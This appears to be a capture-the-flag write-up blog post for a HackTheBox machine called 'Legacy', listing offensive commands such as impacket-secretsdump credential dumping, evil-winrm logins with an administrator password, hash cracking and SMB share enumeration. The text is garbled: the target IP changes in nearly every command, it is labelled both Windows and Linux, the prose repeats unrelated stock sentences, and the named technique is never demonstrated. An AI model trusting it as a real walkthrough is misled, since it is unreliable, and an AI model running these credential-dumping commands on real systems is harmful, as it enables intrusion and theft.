---
TitleSEO: "HackTheBox — Legacy (Insane Windows) | ZureFX"
TitlePost: "HackTheBox — Legacy (Insane Windows)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Legacy. NTLM Relay and Insecure Deserialization to achieve insane compromise on Windows."
Keywords: "offsec, linux, insane, reversing, active directory"
URL: "https://zurefx.github.io/writeups/htb-legacy-548.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-legacy-548/"
Date: "2026-03-16"
Tags: "OffSec, Linux, Insane, Reversing, Active Directory"
Section: "writeups"
Lang: "en"
main_img: "htb-legacy-548"
Permalink: "/writeups/htb-legacy-548.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Legacy** is rated **Insane** on HackTheBox. It runs **Windows** and the IP address during this analysis was `10.14.136.211`.

### Objectives

The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.59.251.119 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials.

### Service Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.129.177.186
evil-winrm -i 10.101.178.183 -u administrator -p 'P@ssw0rd!'
```

Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism.

### SMB Enumeration

Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files.

```bash
crackmapexec smb 10.72.73.66 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.92.19.175/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.37.131.95 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.49.96.233/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Unconstrained delegation was enabled on the compromised machine. Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

## Exploitation

### Vulnerability Identification

The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

Key finding: **NTLM Relay**.

Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory.

### Initial Access

Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.106.155.88
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.65.55.86
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service.

## Privilege Escalation

### Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.28.23/FUZZ
```

### Exploitation

Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target.

```powershell
crackmapexec smb 10.112.125.217 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.49.153.148
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target.

## Summary

### Tools Used

- `msfvenom`
- `hashcat`
- `crackmapexec`
- `nikto`
- `ligolo-ng`

### Key Takeaways

- NTLM Relay
- Insecure Deserialization
- LXD Privilege Escalation
